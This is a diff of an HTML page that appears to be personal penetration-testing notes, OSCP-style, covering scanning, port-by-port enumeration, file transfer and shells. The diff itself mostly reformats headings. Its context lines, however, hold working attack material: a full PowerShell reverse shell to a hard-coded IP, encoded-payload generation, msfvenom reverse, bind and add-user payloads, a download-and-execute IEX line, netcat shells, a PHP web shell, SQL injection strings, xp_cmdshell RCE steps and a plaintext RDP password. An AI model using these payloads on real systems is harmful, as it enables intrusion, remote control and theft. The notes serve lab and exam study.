@@ -174,7 +174,12 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h2 id="random-things"><a class="header" href="#random-things">Random things</a></h2>
+                        <h2 id="quick-notes"><a class="header" href="#quick-notes">Quick Notes</a></h2>
+<h2 id="links"><a class="header" href="#links">Links</a></h2>
+<ul>
+<li><a href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
+</ul>
+<h3 id="random-things"><a class="header" href="#random-things">Random things</a></h3>
 <h3 id="remote-desktop-specific"><a class="header" href="#remote-desktop-specific">Remote Desktop Specific</a></h3>
 <pre><code>xfreerdp /cert-ignore /compression /auto-reconnect /u:dmzadmin /p:SlimGodhoodMope /v:192.168.188.191 /w:1600 /h:800 
 
@@ -240,7 +245,8 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 print(cmd)
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="nmap-scans"><a class="header" href="#nmap-scans">Nmap Scans</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="scanning"><a class="header" href="#scanning">Scanning</a></h2>
+<h3 id="nmap-scans"><a class="header" href="#nmap-scans">Nmap Scans</a></h3>
 <pre><code>nmap -A -p- -T4 -O $ip
 
 --script vuln, http-enum, http-headers
@@ -254,7 +260,7 @@ nmap &lt;IP&gt;/24 # Subnet
 nmap -sT -p- --min-rate 5000 --max-retries 1 &lt;IP&gt; # TCP Ports 
 nmap -sU -p- --min-rate 5000 --max-retries 1 &lt;IP&gt; # UDP Ports
 </code></pre>
-<h2 id="rustscan--autorecon--nmapautomator"><a class="header" href="#rustscan--autorecon--nmapautomator">RustScan &amp; Autorecon &amp; nmapAutomator</a></h2>
+<h3 id="rustscan--autorecon--nmapautomator"><a class="header" href="#rustscan--autorecon--nmapautomator">RustScan &amp; Autorecon &amp; nmapAutomator</a></h3>
 <pre><code>RustScan:  docker run -it --rm --name rustscan rustscan/rustscan:2.0.0 -a &lt;IP&gt; range 0-65535 -- -A
 
 Autorecon: autorecon &lt;IP&gt; 
@@ -265,16 +271,16 @@ env "PATH=$PATH" autorecon $ip
 
 ./nmapAutomator.sh -H $ip -t Recon
 </code></pre>
-<h2 id="powershell-port-scan"><a class="header" href="#powershell-port-scan">Powershell Port Scan</a></h2>
+<h3 id="powershell-port-scan"><a class="header" href="#powershell-port-scan">Powershell Port Scan</a></h3>
 <pre><code>Test-NetConnection -Port 445 192.168.50.151
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2&gt;$null
 </code></pre>
-<h2 id="bash-port-scan"><a class="header" href="#bash-port-scan">Bash Port Scan</a></h2>
+<h3 id="bash-port-scan"><a class="header" href="#bash-port-scan">Bash Port Scan</a></h3>
 <pre><code>
 for i in $(seq 1 254); do nc -zv -w 1 172.16.210.$i 445; done
 
 </code></pre>
-<h2 id="python-port-scan"><a class="header" href="#python-port-scan">Python Port Scan</a></h2>
+<h3 id="python-port-scan"><a class="header" href="#python-port-scan">Python Port Scan</a></h3>
 <pre><code>
 import pyfiglet
 import sys
@@ -323,7 +329,7 @@ except socket.error:
 
 
 </code></pre>
-<h2 id="directory-busting"><a class="header" href="#directory-busting">Directory Busting</a></h2>
+<h3 id="directory-busting"><a class="header" href="#directory-busting">Directory Busting</a></h3>
 <pre><code>dirb http:///&lt;IP&gt;/ # If port -&gt; 443, Do HTTPS
 
 gobuster dir -x php,txt,xml,asp,aspx --url http://&lt;IP&gt;/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -b 404 -f 
@@ -341,10 +347,10 @@ dirbuster -u http://10.10.105.213/
 dirsearch -u url -w wordlist
 
 </code></pre>
-<h2 id="vulnerability-scanner---nikto"><a class="header" href="#vulnerability-scanner---nikto">Vulnerability Scanner - Nikto</a></h2>
+<h3 id="vulnerability-scanner---nikto"><a class="header" href="#vulnerability-scanner---nikto">Vulnerability Scanner - Nikto</a></h3>
 <pre><code>nikto -host http://&lt;IP&gt;/ # If port -&gt; 443, Do HTTPS
 </code></pre>
-<h2 id="wp-scan"><a class="header" href="#wp-scan">WP Scan</a></h2>
+<h3 id="wp-scan"><a class="header" href="#wp-scan">WP Scan</a></h3>
 <pre><code>Enumerating Users
 wpscan --url [target-url] --enumerate u
 
@@ -367,16 +373,17 @@ API Token
 wpscan --url [target-url] --api-token [YourWPScanAPIToken]
 
 </code></pre>
+<h3 id="nmap-cheat-sheet"><a class="header" href="#nmap-cheat-sheet">Nmap Cheat Sheet</a></h3>
 <p><img src="nmapcheatsheet.png" alt="nMap Cheat Sheet" /></p>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="links"><a class="header" href="#links">Links</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="file-transfer"><a class="header" href="#file-transfer">File Transfer</a></h2>
+<h3 id="links-1"><a class="header" href="#links-1">Links</a></h3>
 <ul>
 <li><a href="https://juggernaut-sec.com/windows-file-transfers-for-hackers/">Windows File Transfer</a></li>
-<li></li>
 </ul>
-<h2 id="introduction"><a class="header" href="#introduction"><strong>Introduction</strong></a></h2>
+<h3 id="introduction"><a class="header" href="#introduction"><strong>Introduction</strong></a></h3>
 <p>When performing enumeration steps during a penetration test, there is often the need to transfer files to or from the victim machine, for example to run custom scripts or analyze files further in a controlled environment.</p>
 <p>There are different techniques and tools that can be used to transfer files and depending on the target operating system and installed software these may or may not work. The purpose of this cheat sheet is to provide an exhaustive resource for transferring files using command-line interfaces.</p>
-<h2 id="hosting-files"><a class="header" href="#hosting-files"><strong>Hosting Files</strong></a></h2>
+<h3 id="hosting-files"><a class="header" href="#hosting-files"><strong>Hosting Files</strong></a></h3>
 <p>Files can be hosted using methods such as web servers, FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:</p>
 <div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
 <tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr>
@@ -397,7 +404,7 @@ wpscan --url [target-url] --api-token [YourWPScanAPIToken]
 <tr><td>base64 file;</td><td>Encoding the the file using base 64 and decoding it in the target machine</td></tr>
 </tbody></table>
 </div>
-<h2 id="downloading-files"><a class="header" href="#downloading-files"><strong>Downloading Files</strong></a></h2>
+<h3 id="downloading-files"><a class="header" href="#downloading-files"><strong>Downloading Files</strong></a></h3>
 <p>Files can be downloaded through the use of various tools such as wget/curl FTP, SMB etc. The cheat sheet below provides with some of the most common techniques that can be used to host files:</p>
 <div class="table-wrapper"><table><thead><tr><th></th><th></th></tr></thead><tbody>
 <tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr>
@@ -421,7 +428,7 @@ wpscan --url [target-url] --api-token [YourWPScanAPIToken]
 <tr><td>echo -n “base64-output” &gt; file</td><td>Decoding the base64 output of the file</td></tr>
 </tbody></table>
 </div>
-<h2 id="uploading-file-back-to-kali"><a class="header" href="#uploading-file-back-to-kali">Uploading file back to Kali</a></h2>
+<h3 id="uploading-file-back-to-kali"><a class="header" href="#uploading-file-back-to-kali">Uploading file back to Kali</a></h3>
 <pre><code>When using the python upload script:
 
 On Attacker: python3 SimpleHTTPServerWithUpload.py
@@ -438,7 +445,7 @@ OR
 
 curl -v -XPOST -F "file=@/home/anita/arat/test1;filename=test1" -F "path=/home/kali/Desktop/pen200/relia" http://192.168.45.219:9090/upload
 </code></pre>
-<h2 id="simplehttpserverwithuploadpy"><a class="header" href="#simplehttpserverwithuploadpy">SimpleHTTPServerWithUpload.py</a></h2>
+<h3 id="simplehttpserverwithuploadpy"><a class="header" href="#simplehttpserverwithuploadpy">SimpleHTTPServerWithUpload.py</a></h3>
 <pre><code>***SimpleHTTPServerWithUpload.py
 
 #!/usr/bin/env python3
@@ -819,7 +826,8 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="links-1"><a class="header" href="#links-1">Links</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="ports"><a class="header" href="#ports">Ports</a></h2>
+<h3 id="links-2"><a class="header" href="#links-2">Links</a></h3>
 <ul>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html">Total OSCP Guide</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web">HackTricks 80</a></li>
@@ -828,13 +836,13 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 <li><a href="https://steflan-security.com/ftp-enumeration-guide/">FTP Enum</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">HackTricks 53</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh">HackTricks 22</a></li>
-<li>[NetCat Email][https://www.linuxjournal.com/content/sending-email-netcat]</li>
+<li><a href="https://www.linuxjournal.com/content/sending-email-netcat">NetCat Email</a></li>
 <li><a href="https://infosecwriteups.com/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002">Netcat SMTP</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">MSSQL HackTricks</a></li>
-<li></li>
+<li><a href="https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">Evil WinRM Guide</a></li>
 </ul>
-<h2 id="80443---http"><a class="header" href="#80443---http"><ins>80/443 - HTTP</ins></a></h2>
-<h3 id="first-thing"><a class="header" href="#first-thing">First Thing</a></h3>
+<h3 id="80443---http"><a class="header" href="#80443---http"><ins>80/443 - HTTP</ins></a></h3>
+<h4 id="first-thing"><a class="header" href="#first-thing">First Thing</a></h4>
 <pre><code>
 1. Directory busting: dirb http:///&lt;IP&gt;/ 
 
@@ -849,7 +857,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 6. WordPress Scan: wpscan --url http://&lt;IP&gt;/
 
 </code></pre>
-<h3 id="while-scans-run"><a class="header" href="#while-scans-run">While Scans run:</a></h3>
+<h4 id="while-scans-run"><a class="header" href="#while-scans-run">While Scans run:</a></h4>
 <pre><code>1. Try Weak Credentials, Default Login, Intercept Request in Burp, and Try Dictionary attack to crack the credentials, Try SQLi 
 
 2. Check the Source code if anything Juicy
@@ -865,7 +873,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 9. Find exploits using keywords in the following manner: keyword poc, keyword GitHub, keyword htb, keyword hack the box
 
 </code></pre>
-<h3 id="default-creds-login-page"><a class="header" href="#default-creds-login-page">Default Creds Login Page</a></h3>
+<h4 id="default-creds-login-page"><a class="header" href="#default-creds-login-page">Default Creds Login Page</a></h4>
 <div class="table-wrapper"><table><thead><tr><th>User</th><th>Pass</th></tr></thead><tbody>
 <tr><td>admin</td><td>admin</td></tr>
 <tr><td>admin</td><td>password</td></tr>
@@ -877,7 +885,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 <tr><td>anonymous</td><td>anonymous</td></tr>
 </tbody></table>
 </div>
-<h3 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h3>
+<h4 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h4>
 <div class="table-wrapper"><table><thead><tr><th>User</th><th>Pass</th></tr></thead><tbody>
 <tr><td>tom</td><td>tom</td></tr>
 <tr><td>tom</td><td>' or '1'='1</td></tr>
@@ -889,8 +897,8 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 <tr><td>whatever' or '1'='1</td><td>whatever' or '1'='1</td></tr>
 </tbody></table>
 </div>
-<h2 id="139445---smb"><a class="header" href="#139445---smb"><ins>139/445 - SMB</ins></a></h2>
-<h3 id="try"><a class="header" href="#try">Try</a></h3>
+<h3 id="139445---smb"><a class="header" href="#139445---smb"><ins>139/445 - SMB</ins></a></h3>
+<h4 id="try"><a class="header" href="#try">Try</a></h4>
 <pre><code>1. Find SMB Version: 
 	1. tcpdump -i tun0 port &lt;Victim Port&gt; and src &lt;Victim IP&gt; -s0 -A -n 2&gt;/dev/null 
 	2. crackmapexec smb &lt;Victim IP&gt; --shares --port &lt;Victim Port&gt; 1&gt;/dev/null 2&gt;/dev/null
@@ -917,7 +925,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 
 12. Try Crackmapexec, psexec, smbexec, wmiexec
 </code></pre>
-<h3 id="if-we-have-username-and-password"><a class="header" href="#if-we-have-username-and-password">If we have Username and Password</a></h3>
+<h4 id="if-we-have-username-and-password"><a class="header" href="#if-we-have-username-and-password">If we have Username and Password</a></h4>
 <pre><code>1. Authenticated SMB Shares: smbclient \\\new-site -U &lt;domain_name\username&gt;
 
 2. Null login: crackmapexec smb &lt;IP&gt; --shares -u ' ' -p ''
@@ -935,7 +943,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 
 9. crackmapexec smb 192.168.214.249 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt -d relia.com --continue-on-success 
 </code></pre>
-<h2 id="21---ftp"><a class="header" href="#21---ftp"><ins>21 - FTP</ins></a></h2>
+<h3 id="21---ftp"><a class="header" href="#21---ftp"><ins>21 - FTP</ins></a></h3>
 <pre><code>1. Try FTP Default creds - anonymous:anonymous / admin:admin
 
 2. Once you log in, type passive and binary for file transfer modes
@@ -962,7 +970,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 
 13. Look for hidden files, go back to a directory if you find anything, and look for creds in DB Files.
 </code></pre>
-<h2 id="53---dns"><a class="header" href="#53---dns"><ins>53 - DNS</ins></a></h2>
+<h3 id="53---dns"><a class="header" href="#53---dns"><ins>53 - DNS</ins></a></h3>
 <pre><code>1. nslookup: nslookup --- SERVER &lt;IP&gt; --- 127.0.0.1
 
 2. God command: dig @&lt;IP&gt; any &lt;domain_name&gt;
@@ -978,7 +986,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 7. Nmap Zone Transfer: nmap --script=dns-zone-transfer -p 53 &lt;domain_name&gt;
 
 </code></pre>
-<h2 id="22---ssh"><a class="header" href="#22---ssh"><ins>22 - SSH</ins></a></h2>
+<h3 id="22---ssh"><a class="header" href="#22---ssh"><ins>22 - SSH</ins></a></h3>
 <pre><code>
 1. SSH Login: ssh &lt;username&gt;@&lt;IP&gt;
 
@@ -996,7 +1004,7 @@ with socketserver.TCPServer((BIND, PORT), Handler) as httpd:
 
 8. After initial access, find ssh keys in linux: find / -name ssh 2&gt;/dev/null
 </code></pre>
-<h2 id="3896363268---ldap"><a class="header" href="#3896363268---ldap"><ins>389/636/3268 - LDAP</ins></a></h2>
+<h3 id="3896363268---ldap"><a class="header" href="#3896363268---ldap"><ins>389/636/3268 - LDAP</ins></a></h3>
 <pre><code>1. Domain name: nmap -n -sV --script "ldap* and not brute" &lt;IP&gt;
 
 2. Banner Grabbing: nmap -p 389 --script ldap-search -Pn &lt;IP&gt;
@@ -1018,7 +1026,7 @@ LDAP Login: ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u '&lt;domain\user&gt;' -
 
 
 </code></pre>
-<h2 id="161---snmp"><a class="header" href="#161---snmp"><ins>161 - SNMP</ins></a></h2>
+<h3 id="161---snmp"><a class="header" href="#161---snmp"><ins>161 - SNMP</ins></a></h3>
 <pre><code>
 1. Nmap: sudo nmap -sU --open -p 161 10.11.1.1-254 (find ip with SMTP open)
 
@@ -1033,7 +1041,7 @@ LDAP Login: ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u '&lt;domain\user&gt;' -
 6. Enumerating Open TCP Ports: snmpwalk -c public -v1 &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3
 
 </code></pre>
-<h2 id="25---smtp"><a class="header" href="#25---smtp"><ins>25 - SMTP</ins></a></h2>
+<h3 id="25---smtp"><a class="header" href="#25---smtp"><ins>25 - SMTP</ins></a></h3>
 <pre><code>1. To find Users: nmap --script smtp-enum-users.nse -p 25,465,587 &lt;IP&gt;
 2. If Anonymous Login is allowed we can use Netcat to send Phishing emails through SMTP.
 
@@ -1072,7 +1080,7 @@ Make sure nc is setup and run this:
 
 
 </code></pre>
-<h2 id="3389---rdp"><a class="header" href="#3389---rdp"><ins>3389 - RDP</ins></a></h2>
+<h3 id="3389---rdp"><a class="header" href="#3389---rdp"><ins>3389 - RDP</ins></a></h3>
 <pre><code>If you get RDP, first transfer nc.exe (windows) or netcat (Linux) to get the shell back on our attacking machine.
 
 1. Xfreerdp: xfreerdp /v:&lt;IP&gt; /u:&lt;USER&gt; /d:&lt;DOMAIN&gt; /p:&lt;PASS&gt; +clipboard /dynamic-resolution /drive:/opt,share
@@ -1095,7 +1103,7 @@ Make sure nc is setup and run this:
 
 
 </code></pre>
-<h2 id="135593---rpc"><a class="header" href="#135593---rpc"><ins>135/593 - RPC</ins></a></h2>
+<h3 id="135593---rpc"><a class="header" href="#135593---rpc"><ins>135/593 - RPC</ins></a></h3>
 <pre><code>
 1. Null login: rpcclient &lt;IP&gt; -U ''
 
@@ -1107,7 +1115,7 @@ rpcclient -U "" -N &lt;IP&gt;
 4. Dump: impacket-rpcdump -p 135 &lt;IP&gt;
 
 </code></pre>
-<h2 id="59855986---evil-winrm"><a class="header" href="#59855986---evil-winrm"><ins>5985/5986 - Evil-winrm</ins></a></h2>
+<h3 id="59855986---evil-winrm"><a class="header" href="#59855986---evil-winrm"><ins>5985/5986 - Evil-winrm</ins></a></h3>
 <pre><code>1. Check: crackmapexec --verbose winrm &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt;
 
 2. Try both ports: evil-winrm -i &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt; -p &lt;port&gt;
@@ -1120,7 +1128,7 @@ rpcclient -U "" -N &lt;IP&gt;
 
 
 </code></pre>
-<h2 id="3306---mysql"><a class="header" href="#3306---mysql"><ins>3306 - MYSQL</ins></a></h2>
+<h3 id="3306---mysql"><a class="header" href="#3306---mysql"><ins>3306 - MYSQL</ins></a></h3>
 <pre><code>1. MYSQL Login: mysql -h &lt;IP&gt; -u &lt;username&gt; -p &lt;pass&gt; -P &lt;port&gt;
 
 2. Nmap Vulnerability scan: nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;
@@ -1128,7 +1136,7 @@ rpcclient -U "" -N &lt;IP&gt;
 3. Login: sqsh -S &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -D &lt;database&gt;
 
 </code></pre>
-<h3 id="xp_cmdshell---rce"><a class="header" href="#xp_cmdshell---rce">xp_cmdshell -&gt; RCE</a></h3>
+<h4 id="xp_cmdshell---rce"><a class="header" href="#xp_cmdshell---rce">xp_cmdshell -&gt; RCE</a></h4>
 <pre><code>sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;
 
 In sqsh, you need to use GO after writing the query to send it
@@ -1180,7 +1188,7 @@ nc -nvlp 4444
 admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 
 </code></pre>
-<h2 id="1433---mssql"><a class="header" href="#1433---mssql"><ins>1433 - MSSQL</ins></a></h2>
+<h3 id="1433---mssql"><a class="header" href="#1433---mssql"><ins>1433 - MSSQL</ins></a></h3>
 <pre><code>
 1. Login: sqsh -S &lt;IP&gt; -U &lt;username&gt; -P "&lt;pass&gt;"
 
@@ -1191,7 +1199,7 @@ admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 4. Login: impacket-mssqlclient :&lt;username&gt;:&lt;pass&gt;@&lt;IP&gt; -local-auth
 
 </code></pre>
-<h3 id="xp_cmdshell---rce-1"><a class="header" href="#xp_cmdshell---rce-1">xp_cmdshell -&gt; RCE</a></h3>
+<h4 id="xp_cmdshell---rce-1"><a class="header" href="#xp_cmdshell---rce-1">xp_cmdshell -&gt; RCE</a></h4>
 <pre><code>sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;
 
 In sqsh, you need to use GO after writing the query to send it
@@ -1214,19 +1222,14 @@ RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="go-to"><a class="header" href="#go-to"><ins>Go To</ins></a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="shells"><a class="header" href="#shells">Shells</a></h2>
+<h3 id="go-to"><a class="header" href="#go-to"><ins>Go To</ins></a></h3>
 <ul>
-<li>
-<p><a href="https://www.revshells.com/">Reverse Shell Generator</a></p>
-</li>
-<li>
-<p><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PenTestMonkey</a></p>
-</li>
-<li>
-<p><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/">Payloads All The Things</a></p>
-</li>
+<li><a href="https://www.revshells.com/">Reverse Shell Generator</a></li>
+<li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PenTestMonkey</a></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/">Payloads All The Things</a></li>
 </ul>
-<h2 id="quick-note"><a class="header" href="#quick-note">Quick Note</a></h2>
+<h3 id="quick-note"><a class="header" href="#quick-note"><ins>Quick Note</ins></a></h3>
 <pre><code>
 Some people have luck using this to provide a cleaner shell, etc...doesn't seem to always work. At least use rlwrap with nc, if nothing else.
 
@@ -1248,13 +1251,13 @@ export TERM=xterm-256color
 stty rows &lt;num&gt; columns &lt;cols&gt;
 
 </code></pre>
-<h2 id="web-shells"><a class="header" href="#web-shells"><ins>WEB SHELLS</ins></a></h2>
+<h3 id="web-shells"><a class="header" href="#web-shells"><ins>WEB SHELLS</ins></a></h3>
 <p><strong>/usr/share/webshells</strong></p>
 <p><strong>MSFvenom Format:-</strong></p>
 <p><code>msfvenom -p &lt;PAYLOAD&gt; -e &lt;ENCODER&gt; -f &lt;FORMAT&gt; -i &lt;ENCODE COUNT&gt; LHOST=&lt;IP&gt;</code></p>
 <p>One can also use the <code>-a</code> to specify the architecture or the <code>--platform</code></p>
-<h2 id="windows"><a class="header" href="#windows"><ins>WINDOWS</ins></a></h2>
-<h3 id="reverse-shell"><a class="header" href="#reverse-shell"><strong>Reverse Shell</strong></a></h3>
+<h3 id="windows"><a class="header" href="#windows"><ins>WINDOWS</ins></a></h3>
+<h4 id="reverse-shell"><a class="header" href="#reverse-shell"><strong>Reverse Shell</strong></a></h4>
 <pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe
 
 msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell-x86.exe
@@ -1265,27 +1268,27 @@ msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
 </code></pre>
-<h3 id="bind-shell"><a class="header" href="#bind-shell">Bind Shell[]</a></h3>
+<h4 id="bind-shell"><a class="header" href="#bind-shell">Bind Shell</a></h4>
 <pre><code>msfvenom -p windows/meterpreter/bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; bind.exe
 </code></pre>
-<h3 id="create-user"><a class="header" href="#create-user">Create User</a></h3>
+<h4 id="create-user"><a class="header" href="#create-user">Create User</a></h4>
 <pre><code>msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe &gt; adduser.exe
 </code></pre>
-<h3 id="cmd-shell"><a class="header" href="#cmd-shell">CMD Shell</a></h3>
+<h4 id="cmd-shell"><a class="header" href="#cmd-shell">CMD Shell</a></h4>
 <pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; prompt.exe
 </code></pre>
-<h3 id="execute-command"><a class="header" href="#execute-command"><strong>Execute Command</strong></a></h3>
+<h4 id="execute-command"><a class="header" href="#execute-command"><strong>Execute Command</strong></a></h4>
 <pre><code>msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe &gt; pay.exe
 
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe &gt; pay.exe
 </code></pre>
-<h3 id="encoder"><a class="header" href="#encoder">Encoder</a></h3>
+<h4 id="encoder"><a class="header" href="#encoder">Encoder</a></h4>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe
 </code></pre>
-<h3 id="embedded-inside-executable"><a class="header" href="#embedded-inside-executable">Embedded inside executable</a></h3>
+<h4 id="embedded-inside-executable"><a class="header" href="#embedded-inside-executable">Embedded inside executable</a></h4>
 <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 </code></pre>
-<h3 id="powershell"><a class="header" href="#powershell">Powershell</a></h3>
+<h4 id="powershell"><a class="header" href="#powershell">Powershell</a></h4>
 <pre><code>$client = New-Object System.Net.Sockets.TCPClient('192.168.45.225',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2&gt;&amp;1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 Apparently this is a more evasive way of doing it:
@@ -1313,7 +1316,7 @@ $MyBase64
 
 
 </code></pre>
-<h3 id="python-to-encode-powershell-reverse-shell"><a class="header" href="#python-to-encode-powershell-reverse-shell">Python to encode Powershell Reverse Shell</a></h3>
+<h4 id="python-to-encode-powershell-reverse-shell"><a class="header" href="#python-to-encode-powershell-reverse-shell">Python to encode Powershell Reverse Shell</a></h4>
 <pre><code>Quick Python Powershell Reverse Shell generator
 ---
 
@@ -1327,8 +1330,8 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 print(cmd)
 
 </code></pre>
-<h2 id="linux"><a class="header" href="#linux"><ins>LINUX</ins></a></h2>
-<h3 id="reverse-shell-1"><a class="header" href="#reverse-shell-1"><strong>Reverse Shell</strong></a></h3>
+<h3 id="linux"><a class="header" href="#linux"><ins>LINUX</ins></a></h3>
+<h4 id="reverse-shell-1"><a class="header" href="#reverse-shell-1"><strong>Reverse Shell</strong></a></h4>
 <pre><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf
 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x86.elf
@@ -1337,15 +1340,15 @@ msfvenom -p linux/x64/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f e
 
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell-x64.elf
 </code></pre>
-<h3 id="bind-shell-1"><a class="header" href="#bind-shell-1">Bind Shell</a></h3>
+<h4 id="bind-shell-1"><a class="header" href="#bind-shell-1">Bind Shell</a></h4>
 <pre><code>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; bind.elf
 </code></pre>
-<h3 id="sunos-solaris"><a class="header" href="#sunos-solaris">SunOS (Solaris)</a></h3>
+<h4 id="sunos-solaris"><a class="header" href="#sunos-solaris">SunOS (Solaris)</a></h4>
 <pre><code>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -e x86/shikata_ga_nai -b '\x00' &gt; solshell.elf
 </code></pre>
-<h2 id="web-based-payloads"><a class="header" href="#web-based-payloads"><ins>Web-Based Payloads</ins></a></h2>
-<h3 id="php"><a class="header" href="#php"><strong>PHP</strong></a></h3>
-<h4 id="reverse-shell-2"><a class="header" href="#reverse-shell-2">Reverse shel<strong>l</strong></a></h4>
+<h3 id="web-based-payloads"><a class="header" href="#web-based-payloads"><ins>Web-Based Payloads</ins></a></h3>
+<h4 id="php"><a class="header" href="#php"><strong>PHP</strong></a></h4>
+<h5 id="reverse-shell-2"><a class="header" href="#reverse-shell-2">Reverse shel<strong>l</strong></a></h5>
 <pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php
 
 cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
@@ -1361,31 +1364,31 @@ system('nc.exe -e cmd.exe 10.10.10.5 4444')
 </code></pre>
 <pre><code>&lt;?php system($_REQUEST["cmd"]); ?&gt;
 </code></pre>
-<h3 id="aspx"><a class="header" href="#aspx">ASP/x</a></h3>
-<h4 id="reverse-shell-3"><a class="header" href="#reverse-shell-3">Reverse shell</a></h4>
